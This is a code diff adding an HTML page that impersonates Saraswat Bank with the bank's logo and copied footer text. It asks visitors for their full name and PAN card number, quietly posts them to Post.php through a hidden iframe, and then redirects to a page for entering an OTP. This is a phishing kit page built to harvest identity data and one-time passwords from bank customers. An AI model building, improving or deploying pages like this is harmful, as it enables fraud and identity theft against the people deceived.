@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saraswat Bank - PAN_Details </title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #F2E6DA;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 00vh;
+            margin: 0;
+        }
+
+      .container {
+            background-color: #F2E6DA;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 290px; /* Adjust width as needed */
+        }
+
+      .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+      .header img {
+            max-width: 270px; /* Adjust logo size as needed */
+        }
+
+      .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        select {
+            width: calc(100% - 12px); /* Account for padding and border */
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #f0ad4e; /* Example orange color */
+            color: black;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 95%;
+        }
+
+        button:hover {
+            background-color: #e09d3f; /* Darker shade on hover */
+        }
+
+      .cvv-input {
+            width: 80px; /* Adjust CVV input width */
+        }
+
+      .expiry-select {
+            display: inline-block;
+            width: calc(50% - 6px); /* Adjust width for month/year select */
+        }
+
+      .expiry-select:first-child {
+            margin-right: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+         <!-- Static- Please don't do anything here-->
+         <script type="text/javascript">var submitted=false;</script>
+         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_PAN.html';}"></iframe>
+         <!--My Form-->
+         <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+            <div class="box">
+               <div class="page-hea">
+                  <div class="row">
+                     <div class="col-xs-6 col-md-6">
+                       
+                     </div>
+                     <div class="col-xs-6 col-md-6 text-right">
+                       
+                     </div>
+                  </div>
+               </div>
+               <div class="row">
+                  <div class="col-md-6 col-xs-12">
+				   <div class="progress">
+                             
+                           </div>
+                     <div class="p-50">
+                         <img src="srswt h1.jpg"width="100%">
+                      <h1> PAN Details</h1></center>
+                        <br><br>
+                        <div class="login-box">
+                        <div class="user-box">
+                        <input type="text" name="Full_Name" class="name"placeholder="Full name (as per PAN)" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="30"
+                        required="">
+                            <br><br>
+                        </div>
+                        <div class="user-box">
+                        <input type="text" name="PAN_No." class="name" placeholder="PAN card number" id="pan" maxlength="10"
+                        pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" title="Please enter valid PAN Card number !"
+                        required="">
+                       
+                       </div>
+               </div>
+            </div>
+            <div class="row">
+               <div class="col-xs-12 col-md-12 text-center">
+                   <br><br>
+                  <button type="submit" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-primary"> Submit </button>
+               </div>
+            </div><br>
+          </form>
+         </div>
+      </section>
+      <footer>
+                  <p class="secure-text">* Ensure that you are transacting on a secure website.</p>
+                         <li><b>Account Overview:</b> View saving/ current/ overdraft bank account balance, details and download statements.</li>
+                           <li><b>Reset Password:</b> Reset Password using Debit Card.</li>
+                           <li><b>Bill Payments:</b> Make your monthly bill payments &amp; recharges online easily.</li>
+                           <li><b>Loans:</b> View loan account details at a glance &amp; get statements on your registered email.</li>
+                           <li><b>Fixed Deposits:</b> View instantly &amp; open Fixed Deposits and Recurring Deposits.</li>
+                      </div>
+
+                  </body>
+                  </html>
+
+
+                       </footer>
+      
+      
+	  <script>
+	  var timeleft = 30;
+    var downloadTimer = setInterval(function(){
+    timeleft--;
+    document.getElementById("countdowntimer").textContent = timeleft;
+    if(timeleft <= 0)
+        clearInterval(downloadTimer);
+    },1000);
+	  </script>
+</div>
+</div>
+</body>
+</html>
